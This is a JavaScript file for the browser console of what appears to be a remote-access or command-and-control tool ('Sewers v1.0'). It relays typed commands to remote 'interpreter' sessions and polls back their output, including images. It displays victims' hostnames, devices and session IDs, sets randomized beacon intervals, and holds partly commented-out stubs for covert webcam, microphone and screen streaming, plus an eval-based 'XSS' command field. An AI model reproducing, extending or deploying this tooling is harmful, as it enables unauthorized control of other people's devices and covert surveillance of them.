
/* Set functions for terminal.html */

	// Sleep
	app.functions.sleep = async seconds => {
		return new Promise(async resolve=>{
			setTimeout(resolve, seconds * 1000)
		})
	}

	// Escape HTML
	app.functions.escapeHTML = async data => {
		return new String(data)
			.replace(/\&/g, "&amp;")
			.replace(/\</g,"&lt;")
			.replace(/\>/g,"&gt;")
			.replace(/\"/g, "&quot;")
			.replace(/\'/g,"&#39;")
			.replace(/\\/g, "&#92;")
			.replace(/\//g, "&#x2F;")
			.replace(/ /g, "&nbsp;")
			.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;")
			.replace(/\n/g, "<br>")
	}

	// Strip strings
	app.functions.strip = async data => {
		return data.replace(/^\s*/, "").replace(/\s*$/, "")
	}

	// Generate random string
	app.functions.randomString = async (min, max) => {
		const length = ( min + ( Math.random() * (max - min) ) )
		const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

		let buffer = ""

		while (buffer.length < length) {
			let index = parseInt( Math.random() * chars.length )
			buffer = buffer + chars.charAt(index)
		}

		return buffer
	}

	// Randomize seconds
	app.functions.randTime = async (min, max) => {
		return ( min + ( Math.random() * (max - min) ) )
	}

	// app.functions.Print to terminal
	app.functions.print = async html => {
		const timestamped = document.createElement("stamp")

		timestamped.setAttribute( "time", new Date() )
		timestamped.innerHTML = html

		app.environment.terminal.append(timestamped)

		await app.functions.shrinkInputField()
		await app.functions.resetClearBreaks()

		if (app.environment.scrollOnOutput) {
			app.functions.scrollToBottom()
		}
	}

	// Return readable timestamp
	app.functions.timestamp = async () => {
		const now = new Date()

		let D = now.getDate()
		D < 10 ? D = "0" + D : ""

		let M = now.getMonth() + 1
		M < 10 ? M = "0" + M : ""

		let Y = now.getFullYear()
		Y < 10 ? Y = "0" + Y : ""

		let h = now.getHours()
		h < 10 ? h = "0" + h : ""

		let m = now.getMinutes()
		m < 10 ? m = "0" + m : ""

		let s = now.getSeconds()
		s < 10 ? s = "0" + s : ""

		return D + "-" + M + "-" + Y + " " + h + ":" + m + ":" + s
	}

	app.functions.printInstructions = async () => {
		app.functions.print(
			" <img src=\"/assets/images/os_linux.svg\" width=\"10px\"><span class=\"bold\"> " + navigator.os + " Sewers v1.0<br><br></span>" + 
			"Type <span class=\"orange bold\">?</span>, <span class=\"orange bold\">h</span> or <span class=\"orange bold\">help</span> for more info.<br>"
		)
	}

	app.functions.printHelp = async () => {
		const res = await app.http.Request("GET", "/help.html", [[]], "")

		if (res.status == 200) {
			app.functions.print(res.responseText)
		}
	}

	app.functions.printTelemetry = async () => {
		let icon = "",
		    os_name

		if ( app.environment.sessionConfig.os.indexOf("Android" || "android") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_android.svg\" />"
			os_name = "Android"
		} else if ( app.environment.sessionConfig.os.indexOf("iOS" || "ios") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_apple.svg\" />"
			os_name = "iOS"
		} else if ( app.environment.sessionConfig.os.indexOf("cygwin" || "cygwin" || "mswin" || "mingw" || "bccwin" || "wince" || "emx") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_windows.svg\" />"
			os_name = "Windows"
		} else if ( app.environment.sessionConfig.os.indexOf("Darwin" || "darwin") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_apple.svg\" />"
			os_name = "macOS"
		} else if ( app.environment.sessionConfig.os.indexOf("Linux" || "linux") >= 0 ) {
			icon = "<img height=\"10px\" src=\"../../assets/images/os_linux.svg\" />"
			os_name = "Linux"
		}

		app.functions.print( 
			" " + icon + " <span class=\"bold\">" + os_name + " Interpreter<br><br></span>" + 
			"<span class=\"cyan\">Device</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.device + "</span><br>" + 
			"<span class=\"cyan\">Hostname</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.hostname + "</span><br>" + 
			"<span class=\"cyan\">OS</span>:&nbsp;<span class=\"grey\" style=\"overflow:hidden\">" + app.environment.sessionConfig.os + "</span><br>" + 
			"<span class=\"cyan\">Session&nbsp;ID</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.session_id + "</span><br>" + 
			"<span class=\"cyan\">User-Agent</span>:&nbsp;<span class=\"grey\">" + app.environment.sessionConfig.user_agent + "</span><br>" + 
			"<span class=\"cyan\">Fetch Rate</span>:&nbsp;<span class=\"grey\"><span class=\"bold\">" + app.environment.sessionConfig.fetch_rate.replace("-", "</span> to <span class=\"bold\">") + "</span> seconds.</span><br>" + 
			"<hr>" + 
			" <img src=\"/assets/images/os_linux.svg\" width=\"10px\"><span class=\"bold\"> " + navigator.os + " Sewers v1.0<br><br></span>" + 
			"<span class=\"orange\">Relay Address</span>:&nbsp;<span class=\"grey\">" + app.environment.relayConfig.relay_address + "</span><br>" + 
			"<span class=\"orange\">Relay ID</span>:&nbsp;<span class=\"grey\">" + app.environment.relay + "</span><br>" + 
			"<span class=\"orange\">User-Agent</span>:&nbsp;<span class=\"grey\">" + app.environment.relayConfig.user_agent + "</span><br><br>"
		)
	}

	// Return StdIn to HTTP server
	app.functions.stdIn = async url_encoded => {
		const form = new String(
			"body=" + url_encoded + 
			"&session_id=" + app.environment.session_id + 
			"&relay_id=" + app.environment.relay
		)

		app.functions.showNetworkIndicator()
		app.http.Request("POST", "/post", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
			setTimeout(app.functions.hideNetworkIndicator, 400)
		})
	}

	// Change fetch rate
	app.functions.changeFetchRate = async (min, max) => {
		const form = new String(
			"body=" + app.environment.sessionConfig.fetch_rate_tag + " " + min + " " + max + 
			"&session_id=" + app.environment.session_id + 
			"&relay_id=" + app.environment.relay
		)

		app.functions.showNetworkIndicator()
		app.http.Request("POST", "/fetchrate", [["Content-Type", "application/x-www-form-urlencoded"]], form).then(async(res)=>{
			if (res.status == 200) {
				setTimeout(app.functions.hideNetworkIndicator, 400)

				app.functions.print("<span>Interpreter will be fetching packets every <span class=\"bold\">" + min + "</span> to <span class=\"bold\">" + max + "</span> seconds as soon as it fetches packets.<br></span>")

				app.environment.sessionConfig.fetch_rate = min + "-" + max
			}
		})
	}

	// Fetch new packets from interpreter
	app.functions.fetchPackets = async () => {
		const form = new String(
			"packet_id=" + 
			"&session_id=" + app.environment.session_id + 
			"&relay_id=" + app.environment.relay
		)

		app.functions.showNetworkIndicator()
		let res = await app.http.Request("POST", "/get", [["Content-Type", "application/x-www-form-urlencoded"]], form)
		setTimeout(app.functions.hideNetworkIndicator, 400)

		if (res.status == 200) {
			let response = res.responseText

			if (response.length > 0) {
				let packets = response.split(",")

				for (i = 0; i < packets.length; i++) {
					let packetID = packets[i]

					const form = new String(
						"packet_id=" + packetID + 
						"&session_id=" + app.environment.session_id + 
						"&relay_id=" + app.environment.relay
					)

					app.functions.showNetworkIndicator()
					res = await app.http.Request("POST", "/get", [["Content-Type", "application/x-www-form-urlencoded"]], form)
					setTimeout(app.functions.hideNetworkIndicator, 400)

					response = res.responseText

					if (response.length > 0) {
						new Audio("../../assets/audio/bell.mp3").play()

						const plaintext = atob(response)

						await app.functions.print(app.environment.response_tag + " <span class=\"bold lightgreen\">OK</span> <span>" + await app.functions.timestamp() + "</span><br>")

						if ( plaintext.startsWith("\xff\xd8\xff") || plaintext.startsWith("\xFF\xD8\xFF") ) {
							const type = "image/jpg"
							app.functions.print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await app.functions.escapeHTML(response) + "\" /><br>")
							app.functions.sleep(0.1).then(async()=>{ app.functions.print("<hr>") })
						} else if ( plaintext.startsWith("\x89PNG\r\n\x1a\n") || plaintext.startsWith("\x89PNG\r\n\x1A\n") ) {
							const type = "image/png"
							app.functions.print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await app.functions.escapeHTML(response) + "\" /><br>")
							app.functions.sleep(0.1).then(async()=>{ app.functions.print("<hr>") })
						} else if ( plaintext.startsWith("GIF87a") || plaintext.startsWith("GIF89a") ) {
							const type = "image/gif"
							app.functions.print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await app.functions.escapeHTML(response) + "\" /><br>")
							app.functions.sleep(0.1).then(async()=>{ app.functions.print("<hr>") })
						} else if ( plaintext.startsWith("<?xml") && plaintext.indexOf("<svg") >= 0 || plaintext.startsWith("<svg") ) {
							const type = "image/svg+xml"
							app.functions.print("<img title=\"Packet " + packetID + "\" src=\"data:" + type + ";base64," + await app.functions.escapeHTML(response) + "\" /><br>")
							app.functions.sleep(0.1).then(async()=>{ app.functions.print("<hr>") })
						} else {
							let stdout = await app.functions.escapeHTML(plaintext)
							stdout = stdout + (stdout.endsWith("<br>") ? "" : "\n")
							app.functions.print(stdout)
						}
					}
				}
			}
		}
	}

	// Start auto fetcher
	app.functions.startAutoFetching = async (min, max) => {
		if (app.environment.auto_fetching) {
			await app.functions.stopAutoFetching()

			app.functions.startAutoFetching(min, max)
		} else {
			app.environment.auto_fetching = true

			app.environment.fetch_delay = app.functions.randTime(min, max) * 1000

			app.functions.fetchPackets()

			app.environment.autoFetch = async () => {
				if (app.environment.auto_fetching) {
					app.environment.fetch_delay = await app.functions.randTime(min, max) * 1000

					app.functions.startLoadLine()
					app.functions.fetchPackets()

					app.environment.autoFetchSession = setTimeout(app.environment.autoFetch, app.environment.fetch_delay)
				}
			}

			if (app.environment.fetch_on_auto_fetch_start) {
				app.environment.autoFetchSession = setTimeout(app.environment.autoFetch, 0)
			}

			app.functions.print("<span>Fetching new packets from relay every <span class=\"bold\">" + parseInt(min) + "</span> to <span class=\"bold\">" + parseInt(max) + "</span> seconds.<br></span>")
		}
	}

	// Stop auto fetcher
	app.functions.stopAutoFetching = async (min, max) => {
		if (app.environment.auto_fetching) {
			app.environment.auto_fetching = false

			clearTimeout(app.environment.autoFetchSession)

			app.environment.load_line.classList.add("stop")

			app.functions.print("<span>Auto fetcher stopped.<br></span>")
		} else {
			app.functions.print("<span>Auto fetcher is not running.</span>")
		}
	}

	// Get session config
	app.functions.getSessionConfig = async (relay, session) => {
		const res = await app.http.Request("GET", "/session/" + relay + "/" + session, [[]], "")

		if (res.status == 200) {
			const json = JSON.parse(res.responseText)

			app.environment.sessionConfig = json
		}
	}

	// Get relay config
	app.functions.getRelayConfig = async relay => {
		const res = await app.http.Request("GET", "/config/" + relay, [[]], "")

		if (res.status == 200) {
			const json = JSON.parse(res.responseText)

			app.environment.relayConfig = json
		}
	}

	// Move loadline
	app.functions.startLoadLine = async () => {
		app.environment.load_line.classList.add("stop")

		setTimeout(async()=>{
			const delay = (app.environment.fetch_delay - 600)

			app.environment.load_line.style.transition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			app.environment.load_line.style.webkitTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			app.environment.load_line.style.mozTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			app.environment.load_line.style.msTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"
			app.environment.load_line.style.oTransition = "opacity 360ms linear, width " + delay + "ms linear 360ms"

			app.environment.load_line.classList.remove("stop")
		}, 100)
	}

	// Scroll to bottom
	app.functions.scrollToBottom = async () => {
		app.environment.scrollBox.scrollTop = app.environment.terminal.getBoundingClientRect().height
	}

	// Set clear breaks for clear function
	app.functions.resetClearBreaks = async () => {
		app.environment.clearBreaks = parseInt( ( self.innerHeight - 84 ) / 12 )
	}

	// Shrink input field as scrollbox increases in size
	app.functions.shrinkInputField = async () => {
		app.environment.form.style.height = ( self.innerHeight - app.environment.scrollBox.getBoundingClientRect().height ) + "px"
	}

	// Clear function
	app.functions.clear = async () => {
		app.environment.terminal.innerHTML = ""
		app.functions.shrinkInputField()
	}

	app.functions.parseUserAgent = async () => {
		if ( navigator.userAgent.match(/android/i) ) {
			navigator.os = "Android"
		} else if ( navigator.userAgent.match(/ios/i) ) {
			navigator.os = "iOS"
		} else if ( navigator.userAgent.match(/windows/i) ) {
			navigator.os = "Windows"
		} else if ( navigator.userAgent.match(/mac os/i) ) {
			navigator.os = "macOS"
		} else if ( navigator.userAgent.match(/linux/i) ) {
			navigator.os = "Linux"
		}
	}

	// Append new stream to menu
	app.functions.addStream = async (streamID, streamType) => {
		if (streamType == "STREAMMIC") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".wav', 'width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammic\"><div class=\"icon rec blinking\"></div></div></div>")
		} else if (streamType == "STREAMMON") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon streammon\"><div class=\"icon rec blinking\"></div></div></div>")
		} else if (streamType == "STREAMCAM") {
			document.querySelector("html body div.menu").append("<div class=\"item left\" title=\"Stream ID: " + streamID + "\" onclick=\"window.open('" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4', '" + streamFile + ".mp4', 'width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no')\"><div class=\"icon eye\"><div class=\"icon rec blinking\"></div></div></div>")
		}
	}

	// Start new monitor stream
	app.functions.streamMon = async (bitrate, resolution) => {
		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMON " + bitrate + " " + resolution + "&session_id=" + app.environment.session_id)

		// if (res.status == 200) {
		// 	let response = res.responseText.split(" ")

		// 	let streamID = response[0]
		// 	let streamFile = response[1]

		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

		// 	if (response[0] == "Usage:") {
		// 		app.functions.print("<span>" + response + "</span>")
		// 	} else {
		// 		app.functions.print("<span>Monitor stream started.</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=640,height=360,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?mon&" + streamID + "&" + streamFile + ".mp4</a></span>")

		// 		addStream(streamID, "STREAMMON")
		// 	}
		// }
	}

	// Start new microphone stream
	app.functions.streamMic = async bitrate => {
		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMMIC " + bitrate + "&session_id=" + app.environment.session_id)

		// if (res.status == 200) {
		// 	let response = res.responseText.split(" ")

		// 	let streamID = response[0]
		// 	let streamFile = response[1]

		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

		// 	if (response[0] == "Usage:") {
		// 		app.functions.print("<span>" + response + "</span>")
		// 	} else {
		// 		app.functions.print("<span>Microphone stream started.</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".wav\", \"" + streamFile + ".wav\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?mic&" + streamID + "&" + streamFile + ".wav</a></span>")

		// 		addStream(streamID, "STREAMMIC")
		// 	}
		// }
	}

	// Start new webcam stream
	app.functions.streamCam = async (bitrate, resolution) => {
		// app.functions.print(app.environment.request_tag + "<span title='" + await app.functions.timestamp() + "'>Streaming webcam...</span>")

		// const res = await app.functions.sendRequest("POST", "/", "data=STREAMCAM&session_id=" + app.environment.session_id)

		// if (res.status == 200) {
		// 	let response = res.responseText.split(" ")

		// 	let streamID = response[0]
		// 	let streamFile = response[1]

		// 	app.functions.print(app.environment.response_tag + " [<span class='green'>OK</span>] " + "<span>" + await app.functions.timestamp() + "</span>")

		// 	if (response[0] == "Usage:") {
		// 		app.functions.print("<span>" + response + "</span>")
		// 	} else {
		// 		app.functions.print("<span>Webcam stream started.</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;├&nbsp;Stream ID&nbsp;&nbsp;: </span><span>" + streamID + "</span>")
		// 		app.functions.print("<span>&nbsp;&nbsp;└&nbsp;Stream URL&nbsp;: </span><span><a onclick='window.open(\"" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4\", \"" + streamFile + ".mp4\", \"width=180,height=230,status=no,menubar=no,toolbar=no,titlebar=no,location=no\")'>" + location.protocol + "//" + location.host + "/stream?cam&" + streamID + "&" + streamFile + ".mp4</a></span>")

		// 		addStream(streamID, "STREAMCAM")
		// 	}
		// }
	}

	// Network activity indicator
	app.functions.showNetworkIndicator = async () => {
		const network_indicator = document.querySelector("html body div.menu div.item div.network-indicator")

		network_indicator.classList.add("show")
	}

	// Network activity indicator
	app.functions.hideNetworkIndicator = async () => {
		const network_indicator = document.querySelector("html body div.menu div.item div.network-indicator")

		network_indicator.classList.remove("show")
	}

	// Autocomplete stdin
	app.functions.autoComplete = (tabbed_command, pre_cursor) => {
		const commands = Object.keys(app.commands.builtin).concat( Object.keys(app.commands.pluggedin) )

		tabbed_command = tabbed_command
			.replace(/\[/g, "\\[")
			.replace(/\]/g, "\\]")
			.replace(/\?/g, "[?]")
			.replace(/\!/g, "[!]")
			.replace(/\*/g, "[*]")
			.replace(/\(/g, "[(]")
			.replace(/\)/g, "[)]")
			.replace(/\-/g, "[-]")

		let regexp = new RegExp("(?:^|\\s)" + tabbed_command, "ig")

		if ( commands.join(" ").match(regexp).length > 1 ) {
			app.functions.print( commands.join(" ").match( new RegExp("(?:^|\\s)" + tabbed_command + "\\S*", "ig") ).join("&nbsp;&nbsp;") + "<br>" )
		} else if ( commands.join(" ").match(regexp).length == 1 ) {
			for (let i = 0; i < commands.length; i++) {
				if ( commands[i].match(regexp) ) {
					if ( commands[i].match(regexp).length > 0 ) {
						regexp = new RegExp(tabbed_command + "$", "i")

						replacement = pre_cursor.replace(regexp, commands[i]) + " "

						app.environment.textarea.value = app.environment.textarea.value.replace(pre_cursor, replacement)
						app.environment.textarea.selectionEnd = replacement.length;

						break
					}
				}
			}
		}
	}

	// Input handler
	app.functions.onCommand = async () => {
		const cmd = app.environment.textarea.value

		app.environment.textarea.value = ""

		app.functions.parseCommand(cmd)
	}

	// StdIn handler
	app.functions.parseCommand = async cmd => {
		app.environment.cmd_history_i = 0

		cmd = cmd.replace(/^\s*/, "")

		app.functions.print( app.environment.request_tag + "<span title='" + await app.functions.timestamp() + "'>" + await app.functions.escapeHTML(cmd) + "</span><br>" )

		if ( !cmd.match(/^\s*$/) ) {
			if (app.environment.cmd_history[0] != cmd) {
				app.environment.cmd_history.unshift(cmd)
			}

			// Parse command
			if ( !cmd.match(/^\s*#/) ) {
				const command = cmd.split(" ")[0]
				const args = cmd.replace(/\S+\s*/, "")

				const commands = Object.keys(app.commands.builtin).concat( Object.keys(app.commands.pluggedin) )

				for (let i = 0; i < commands.length; i++) {
					regexp = new RegExp("^" + command
						.replace(/\[/g, "\\[")
						.replace(/\]/g, "\\]")
						.replace(/\?/g, "[?]")
						.replace(/\!/g, "[!]")
						.replace(/\*/g, "[*]")
						.replace(/\(/g, "[(]")
						.replace(/\)/g, "[)]")
						.replace(/\-/g, "[-]") + "$", "i")

					if ( commands[i].match(regexp) ) {
						if (app.commands.builtin[ commands[i] ]) {
							app.commands.builtin[ commands[i] ].launch(args)
						} else {
							app.commands.pluggedin[ commands[i] ].launch(args)
						}
					}
				}
			}

			if ( cmd.match(/^\s*#/) ) {
				return
			} else if ( cmd.match(/^\s*startautofetching /) ) {
				cmd = await app.functions.strip(cmd)

				if (cmd.split(" ")[3]) {
					app.functions.print( "Too many arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await app.functions.escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if (!cmd.split(" ")[2]) {
					app.functions.print( "Not enough arguments.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await app.functions.escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(cmd.split(" ")[1]) >= parseInt(cmd.split(" ")[2]) ) {
					app.functions.print( "Minimum value must be less than maximum.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await app.functions.escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else if ( parseInt(cmd.split(" ")[1]) < 1 ) {
					app.functions.print( "Minimum value must be at least 1.<br>Usage: <span class=\"tan\">startautofetching</span> <span class=\"grey\">" + await app.functions.escapeHTML("<MIN SECONDS> <MAX SECONDS>") + "</span><br>" )
				} else {
					const min = parseInt( cmd.split(" ")[1] ),
					      max = parseInt( cmd.split(" ")[2] )

					app.functions.startAutoFetching(min, max)
				}
			} else if ( cmd.match(/^\s*clear\s*$/) ) {
				app.functions.clear()
			} else if ( cmd.match(/^\s*exit\s*$/) ) {
				self.close() || alert("You can only use this in pop-up windows.")
			} else if ( cmd.match(/^\s*checkstreams\s*$/) ) {
				// checkStreams()
			} else if ( cmd.match(/^\s*stopautofetching\s*$/) ) {
				app.functions.stopAutoFetching()
			} else if ( cmd.match(/^\s*streammon /) ) {
				const args = cmd.split(" ")

				streamMon( args[1], args[2] )
			} else if ( cmd.match(/^\s*streammic /) ) {
				streamMic( cmd.split(" ")[1] )
			} else if ( cmd.match(/^\s*fetch\s*$/) ) {
				app.functions.fetchPackets()
			} else if ( cmd.match(/^shell$/) || cmd.match(/^sh$/) ) {
				// Start shell stream
			} else {
				app.functions.print( await app.functions.escapeHTML(cmd) + ": command not found. Type <span class=\"bold orange\">help</span> to see a list of commands.<br>" )
			}
		}

		app.environment.textarea.focus()
	}

	app.functions.parseXSSCommand = async cmd => {
		app.functions.print( 
			app.environment.request_tag + " <span class=\"bold red\">XSS</span>" + " <span>" + await app.functions.timestamp() + "</span><br>" + 
			"<span class=\"red\">" + await app.functions.escapeHTML(cmd) + "</span><br>" + 
			"<span>" + eval(cmd) + "</span><br>" 
		)
	}

	app.functions.onXSSCommand = async () => {
		const command = app.environment.jsField.value

		app.environment.jsField.value = ""

		app.functions.parseXSSCommand(command)

		app.environment.textarea.focus()
	}
